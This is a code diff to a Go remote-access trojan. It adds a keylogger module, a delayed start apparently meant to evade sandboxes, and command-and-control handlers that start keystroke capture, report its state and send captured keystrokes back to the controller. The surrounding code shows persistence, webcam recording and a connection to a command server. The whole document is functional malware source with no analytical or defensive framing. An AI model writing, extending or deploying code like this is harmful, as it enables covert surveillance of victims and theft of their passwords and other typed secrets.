@@ -13,6 +13,7 @@ import (
 
 	sr "github.com/fstanis/screenresolution"
 	"github.com/kbinani/screenshot"
+	kl "github.com/MarinX/keylogger"
 	"gocv.io/x/gocv"
 )
 
@@ -29,9 +30,13 @@ var (
 var stop = make(chan bool)
 
 func main() {
+	time.Sleep(time.Minute * time.Duration(5))
+
 	if !is_persistent() {
 		persist()
 	}
+
+	time.Sleep(time.Second * time.Duration(5))
 
 	reach_command_and_control()
 }
@@ -120,6 +125,79 @@ func engage_via(conn net.Conn) {
 		} else if cmd == "record_webcam" {
 			result := video_recording(1, 5)
 			send_resp(conn, result)
+		} else if cmd == "keylog_start" {
+			if keylog_flag == 1 {
+				send_resp(conn, "lk already running")
+			} else {
+				keylog_flag = 1
+				resp := "lk started successfully"
+				// start a separate goroutine for the lk
+				go func() {
+					for {
+						select {
+						case <-stop:
+							return
+						default:
+							keyboard := kl.FindKeyboardDevice()
+							if len(keyboard) <= 0 {
+								resp = "No keyboard found"
+							} else {
+								if k, err := kl.New(keyboard); err != nil {
+									resp = err.Error()
+								} else {
+									for keylog_flag == 1 {
+										events := k.Read()
+										for e := range events {
+											switch e.Type {
+											case kl.EvKey:
+												if e.KeyRelease() {
+													tmp := ""
+													switch key := e.KeyString(); key {
+													case "R_SHIFT":
+														tmp = "[r-shift]"
+													case "L_SHIFT":
+														tmp = "[l-shift]"
+													case "Right":
+														tmp = "[r-arrow]"
+													case "Left":
+														tmp = "[l-arrow]"
+													case "ENTER", "Up", "Down":
+														tmp = ""
+													case "SPACE":
+														tmp = " "
+													case "BS":
+														tmp = "[backspace]"
+													case "CAPS_LOCK":
+														tmp = "[caps-lock]"
+													default:
+														tmp = key
+													}
+													keystrokes += tmp
+												}
+											}
+										}
+									}
+								}
+							}
+						}
+					}
+				}()
+				send_resp(conn, resp)
+			}
+		} else if cmd == "keylog_state" {
+			if keylog_flag == 1 {
+				send_resp(conn, "[+] lk running")
+			} else {
+				send_resp(conn, "[-] lk not running")
+			}
+		} else if cmd == "keylog_dump" {
+			if keylog_flag != 1 {
+				send_resp(conn, "lk not yet running")
+			} else {
+				keylog_flag = 0
+				close(stop)
+				send_resp(conn, keystrokes)
+			}
 		}
 	}
 }
